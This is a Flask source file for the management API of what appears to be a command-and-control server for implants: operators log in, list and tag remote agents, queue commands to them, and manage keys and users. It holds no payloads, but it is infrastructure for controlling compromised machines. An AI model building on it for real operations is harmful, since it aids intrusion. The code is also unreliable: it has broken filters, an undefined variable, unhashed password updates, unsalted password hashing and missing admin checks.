from flask import Blueprint, request, jsonify
import json
import hashlib
import jwt
from datetime import datetime, timedelta

from .config import config
from .database import Agent, Task, TaskResult, Key, User
from .auth import login_required

management_routes = Blueprint('management_routes', __name__)

# Login
@management_routes.route('/api/login', methods=['POST'])
def login():
    if 'username' not in request.json or 'password' not in request.json:
        return(jsonify({'message': 'Invalid request'}), 400)

    user = User.select().where((User.username == request.json['username']) & (User.password == hashlib.sha512(request.json['password'].encode('utf-8')).hexdigest()))

    if not user.exists():
        return(jsonify({'message': 'Invalid username or password'}), 401) 

    now = datetime.now()

    token = jwt.encode({'user_id': user[0].id, 'admin': user[0].admin, 'iat': now, 'exp': now+timedelta(days=1)}, config['jwt_secret'], algorithm='HS256')

    return(jsonify({'message': 'Success', 'token': token}), 200)

# Agents
@management_routes.route('/api/agents', methods=['GET'])
@login_required
def get_agents():
    agents = []

    query = Agent.select()

    if 'ip' in request.args:
        query = query.where(Agent.ip == request.args['ip'])

    if 'implant' in request.args:
        query = query.where(Agent.implant_id == request.args['implant'])

    if 'os' in request.args:
        query = query.where(Agent.os == request.args['os'])

    for agent in Agent.select():
        agents.append(agent.serialize())

    return(jsonify({'agents': agents}), 200)

@management_routes.route('/api/agents/<agent_id>', methods=['GET'])
@login_required
def get_agent(agent_id: str):
    agent = Agent.select().where(Agent.id == str(agent_id)).first()

    if not agent:
        return(jsonify({'message': 'No such agent'}), 404)

    return(jsonify(agent.serialize()), 200)

@management_routes.route('/api/agents/<agent_id>', methods=['DELETE'])
@login_required
def delete_agent(agent_id: str):
    agent = Agent.select().where(Agent.id == str(agent_id)).first()

    if not agent:
        return(jsonify({'message': 'No such agent'}), 404)

    for task in Task.select().where(Task.agent_id == agent.id):
        TaskResult.delete().where(TaskResult.task_id == task.id).execute()
        task.delete().execute()

    agent.delete().execute()


    return(jsonify({'message': 'The agent was deleted'}), 204)

@management_routes.route('/api/agents/<agent_id>/tags', methods=['POST'])
@login_required
def tag_agent(agent_id: str):
    agent = Agent.select().where(Agent.id == str(agent_id)).first()

    if not agent:
        return(jsonify({'message': 'No such agent'}), 404)

    if 'tags' not in request.json:
        return(jsonify({'message': 'Invalid request'}), 400)

    tags = request.json['tags']

    if type(tags) != list:
        return(jsonify({'message': 'Invalid request'}), 400)

    agent_tags = json.loads(agent.tags)

    for tag in tags:
        if tag not in agent_tags:
            agent_tags.append(tag)

    agent.update(tags=json.dumps(agent_tags)).where(Agent.id == str(agent_id)).execute()
    
    return(jsonify({'message': 'Agent updated'}), 201)

@management_routes.route('/api/agents/<agent_id>/tags', methods=['DELETE'])
@login_required
def untag_agent(agent_id: str):
    agent = Agent.select().where(Agent.id == str(agent_id)).first()

    if not agent:
        return(jsonify({'message': 'No such agent'}), 404)

    if 'tags' not in request.json:
        return(jsonify({'message': 'Invalid request'}), 400)

    tags = request.json['tags']

    if type(tags) != list:
        return(jsonify({'message': 'Invalid request'}), 400)

    agent_tags = json.loads(agent.tags)



    agent.update(tags=json.dumps(agent_tags)).where(Agent.id == str(agent_id)).execute()
    
    return(jsonify({'message': 'Agent updated'}), 201)

# Tasks
@management_routes.route('/api/tasks', methods=['GET'])
@login_required
def get_tasks():
    tasks = []

    query = Task.select()

    if 'id' in request.args:
        query = query.where(Task.agent_id == request.args['id'])

    if 'agent' in request.args:
        query = query.where(Task.agent_id == request.args['agent'])

    if 'sent' in request.args:
        if request.args['sent'].lower() == 'true':
            query = query.where(Task.sent == True)
        elif request.args['sent'].lower() == 'false':
            query = query.where(Task.sent == False)
        else:
            return(jsonify({'message': 'Invalid request'}), 400)

    if 'completed' in request.args:
        if request.args['completed'].lower() == 'true':
            query = query.where(Task.completed == True)
        elif request.args['completed'].lower() == 'false':
            query = query.where(Task.completed == False)
        else:
            return(jsonify({'message': 'Invalid request'}), 400)

    for task in query:
        tasks.append(task.serialize())

    return(jsonify({'tasks': tasks}), 200)

# Task results
@management_routes.route('/api/task-results', methods=['GET'])
@login_required
def get_taskresults():
    results = []

    query = TaskResult.select()

    if 'id' in request.args:
        query = query.where(TaskResult.id == request.args['id'])

    if 'task_id' in request.args:
        query = query.where(TaskResult.task == request.args['agent'])

    for result in query:
        results.append(result.serialize())

    return(jsonify({'results': results}), 200)

@management_routes.route('/api/tasks', methods=['POST'])
@login_required
def create_task():
    if 'agent_id' not in request.json or 'command' not in request.json or 'args' not in request.json:
        return(jsonify({'message': 'Invalid request'}), 400)

    query = Agent.select().where(Agent.id==request.json['agent_id'])


    if len(query) == 0:
        return(jsonify({'message': 'No such agent'}), 404)

    commands_json = json.loads(query[0].commands)

    for command in commands_json:
        if command['command'] == request.json['command']:
            user_args = request.json['args']
            required_args = 0

            for arg in command['args']:
                if arg['required'] == True:
                    required_args += 1

            if len(user_args) != required_args:
                return(jsonify({'message': 'Invalid command arguments'}), 404)

            Task.create(agent=request.json['agent_id'], task=request.json['command'], args=json.dumps(user_args))

            return(jsonify({'message': 'Task sent'}), 201)

    return(jsonify({'message': 'Invalid task'}), 400)

# Keys
@management_routes.route('/api/keys', methods=['GET'])
@login_required
def get_keys():
    keys = []
    for key in Key.select():
        keys.append(key.serialize())

    return(jsonify({'keys': keys}), 200)

@management_routes.route('/api/keys', methods=['POST'])
@login_required
def create_key():
    if 'key' not in request.json or 'name' not in request.json:
        return(jsonify({'message': 'Invalid request'}), 400)

    name = request.json['name']
    key = request.json['key']

    if Key.select().where(Key.name==name).exists():
        return(jsonify({'message': 'A key with that name already exists'}))

    Key.create(name=name, key=key)
    
    return(jsonify({'message': 'The key was created'}), 201)

@management_routes.route('/api/keys', methods=['DELETE'])
@login_required
def delete_key():
    if 'id' not in request.json:
        return(jsonify({'message': 'Invalid request'}), 400)

    key_id = request.json['id']

    if not Key.select().where(Key.id==key_id).exists():
        return(jsonify({'message': 'No such key'}), 404)

    Key.delete().where(Key.id == key_id).execute()

    return(jsonify({'message': 'The key was deleted'}), 204)

# Users
@management_routes.route('/api/users', methods=['GET'])
@login_required
def get_users():
    users = []
    for user in User.select():
        users.append(user.serialize())

    return(jsonify({'users': users}), 200)

@management_routes.route('/api/users', methods=['POST'])
@login_required
def create_user():
    if 'username' not in request.json or 'password' not in request.json or 'admin' not in request.json:
        return(jsonify({'message': 'Invalid request'}), 400)

    username = request.json['username']
    password = request.json['password']
    admin = request.json['admin']

    if admin not in [True, False]:
        return(jsonify({'message': 'Invalid request'}), 400)

    if User.select().where(User.username == username).exists():
        return(jsonify({'message': 'A user with that username already exists'}), 403)

    User.create(username=username, password=hashlib.sha512(password.encode('utf-8')).hexdigest(), admin=admin)

    return(jsonify({'message': 'Success'}), 200)

@management_routes.route('/api/users', methods=['PATCH'])
@login_required
def edit_user():
    if 'id' not in request.json:
        return(jsonify({'message': 'Invalid request'}), 400)

    if not User.select().where(User.id == request.json['id']).exists():
        return(jsonify({'message': 'No such user'}), 404)

    if 'username' in request.json:
        User.update(username=request.json['username']).where(User.id==request.json['id']).execute()
    elif 'password' in request.json:
        User.update(password=request.json['password']).where(User.id==request.json['id']).execute()
    elif 'admin' in request.json:
        if admin not in [True, False]:
            return(jsonify({'message': 'Invalid request'}), 400)
        
        User.update(admin=request.json['admin']).where(User.id==request.json['id']).execute()

    return(jsonify({'message': 'User updated'}), 200)

@management_routes.route('/api/users', methods=['DELETE'])
@login_required
def delete_user():
    if 'id' not in request.json:
        return(jsonify({'message': 'Invalid request'}), 400)

    if not User.select().where(User.id == request.json['id']).exists():
        return(jsonify({'message': 'No such user'}), 404)

    User.delete().where(User.id == request.json['id']).execute()

    return(jsonify({'message': 'User deleted'}), 204)
